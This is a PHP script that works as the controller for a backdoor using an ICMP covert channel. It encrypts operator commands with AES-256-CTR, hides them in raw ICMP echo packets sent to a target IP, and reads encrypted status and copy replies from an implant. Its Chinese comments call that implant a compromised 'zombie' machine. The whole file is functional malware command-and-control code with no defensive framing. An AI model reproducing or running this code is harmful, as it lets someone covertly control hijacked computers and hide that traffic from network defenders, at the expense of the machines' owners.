<?php

if ($argc < 4) {
    echo "用法: php icmp.php <IP> <cmd> <aes_key>\n";
    exit;
}

$dst_ip = $argv[1];
$plaintext = "ZKcommand," . $argv[2];
$key = hex2bin($argv[3]);

// =====================================================
//  AES 加密封包
// =====================================================
$iv = random_bytes(16);

$ciphertext = openssl_encrypt(
    $plaintext,
    "AES-256-CTR",
    $key,
    OPENSSL_RAW_DATA,
    $iv
);

// Base64( IV | ciphertext ) + null terminator
$payload = base64_encode($iv . $ciphertext) . "\0";

// =====================================================
//  Raw socket
// =====================================================
$socket = socket_create(AF_INET, SOCK_RAW, 1);
if (!$socket) {
    echo "SOCKET_ERROR\n";
    exit;
}

// non-blocking mode
socket_set_nonblock($socket);

$type = 8;
$code = 0;
$id   = 0x8888;
$seq  = 0x1111;

// checksum
function icmp_checksum($data)
{
    $bit = unpack('n*', $data);
    $sum = array_sum($bit);
    while ($sum >> 16) {
        $sum = ($sum >> 16) + ($sum & 0xFFFF);
    }
    return ~$sum & 0xFFFF;
}

$header = pack("CCnnn", $type, $code, 0, $id, $seq);
$packet = $header . $payload;
$cs = icmp_checksum($packet);

// rebuild with checksum
$header = pack("CCnnn", $type, $code, $cs, $id, $seq);
$packet = $header . $payload;

// =====================================================
//  發送封包
// =====================================================
socket_sendto($socket, $packet, strlen($packet), 0, $dst_ip, 0);

// =====================================================
//  等待肉雞回覆（最多 10 秒）
// =====================================================
$start = time();

while (true) {

    if (time() - $start > 4) {
        echo "TIMEOUT\n";
        break;
    }

    $buf = '';
    $len = @socket_recv($socket, $buf, 3000, 0);

    if ($len === false || $len <= 0) {
        usleep(50000);
        continue;
    }

    // strip IPv4 header
    $ihl = (ord($buf[0]) & 0x0F) * 4;
    $icmp = substr($buf, $ihl);

    if (strlen($icmp) < 8) continue;

    $type    = ord($icmp[0]);
    $recv_id = unpack("n", substr($icmp, 4))[1];

    if ($type != 0 || $recv_id != $id) continue;

    // extract payload
    $reply_payload = substr($icmp, 8);

    $decoded = base64_decode($reply_payload);
    if ($decoded === false || strlen($decoded) < 17) continue;

    $reply_iv = substr($decoded, 0, 16);
    $reply_ct = substr($decoded, 16);

    $reply = openssl_decrypt(
        $reply_ct,
        "AES-256-CTR",
        $key,
        OPENSSL_RAW_DATA,
        $reply_iv
    );

    $trimmed = trim($reply);

    // ★ 加入 DEBUG 輸出，讓你看到到底收到了什麼 (正式使用時可註解掉)
    //echo "DEBUG: Decrypted: [$trimmed]\n";

    // checkAlive 回覆
    if (str_starts_with($trimmed, "RJalive,")) {
        echo $trimmed . "\n";
        break;
    }

    // COPY 回覆
    // ★ 修正重點：只要開頭是 "RJcopy," 就視為成功
    if (str_starts_with($trimmed, "RJcopy,")) {
        echo $trimmed . "\n";
        break;
    }

    // 無效 -> kernel echo
    continue;
}

?>